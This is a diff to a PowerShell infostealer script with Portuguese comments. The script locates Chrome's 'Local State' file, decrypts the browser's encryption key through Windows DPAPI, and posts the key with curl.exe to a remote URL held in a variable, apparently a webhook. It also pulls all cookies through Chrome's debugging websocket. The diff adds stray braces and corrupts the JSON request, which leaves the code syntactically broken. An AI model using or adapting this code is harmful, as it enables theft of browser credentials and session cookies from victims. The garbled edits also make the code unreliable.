@@ -20,7 +20,7 @@ $ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -
 $json = Get-Content $ls.FullName -Raw | ConvertFrom-Json
 $encKey = $json.os_crypt.encrypted_key
 $bytes = [Convert]::FromBase64String($encKey)
-
+)}
 # 3. Tenta descriptografar usando uma chamada direta de Memória
 try {
     $bytes = $bytes[5..($bytes.Length - 1)]
@@ -28,10 +28,10 @@ try {
     $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
     $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, $scope)
     $finalKey = [Convert]::ToBase64String($unprotected)
-    
+}
     # Se a chave for pequena (44 caracteres), funcionou!
     curl.exe -X POST -F "content=🔑 CHAVE_REAL_CURTA: $finalKey" $u
-} catch {
+    catch {
     # Se falhar, vamos mandar a Chave Bruta de novo mas com um aviso
     curl.exe -X POST -F "content=⚠️ O Windows bloqueou a abertura. Tente usar esta chave bruta no Dashboard atualizado: $encKey" $u
 }
@@ -297,7 +297,7 @@ function Save-ChromeDebugCookies {
                 $uri = [System.Uri]::new($wsUrl)
                 $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
                 
-                $sendBytes = [System.Text.Encoding]::UTF8.GetBytes('{"id":1,"method":"Network.getAllCookies"}')
+                $sendBytes = [System.Text.Encoding]::UTF8.GetBytes('{"id":"method":"Network.getAllCookies"}')
                 $sendSeg = [System.ArraySegment[byte]]::new($sendBytes)
                 $ws.SendAsync($sendSeg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
                 
@@ -542,5 +542,3 @@ try {
 } catch {
     Write-Log "Erro ao salvar local: $_"
 }
-
-Write-Log '=== Concluido ==='
